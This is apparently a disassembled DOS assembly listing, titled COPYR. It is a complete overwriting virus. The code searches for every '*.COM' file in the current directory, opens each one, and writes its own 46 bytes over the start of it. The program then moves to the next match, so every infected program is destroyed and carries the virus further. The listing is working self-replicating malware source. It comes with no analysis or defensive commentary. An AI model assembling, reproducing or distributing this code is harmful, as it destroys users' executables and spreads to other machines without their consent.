  
PAGE  59,132
  
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        COPYR				         лл
;лл								         лл
;лл      Created:   1-Jan-80					         лл
;лл      Version:						         лл
;лл      Passes:    5	       Analysis Options on: AFOP	         лл
;лл								         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
  
data_1e		equ	9Eh			; (996E:009E=0)
  
seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
COPYR		proc	far
  
start:
		mov	ah,4Eh			; 'N'
		mov	cl,20h			; ' '
		mov	dx,offset data_3	; (996E:0128=2Ah)
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
loc_1:
		mov	dx,data_1e		; (996E:009E=0)
		mov	ax,3D01h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	bx,ax
		mov	dx,offset ds:[100h]	; (996E:0100=0B4h)
		mov	cl,2Eh			; '.'
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_1			; Jump if carry=0
		int	20h			; Program Terminate
data_3		db	2Ah
		db	 2Eh, 43h, 4Fh, 4Dh, 00h
  
COPYR		endp
  
seg_a		ends
  
  
  
		end	start
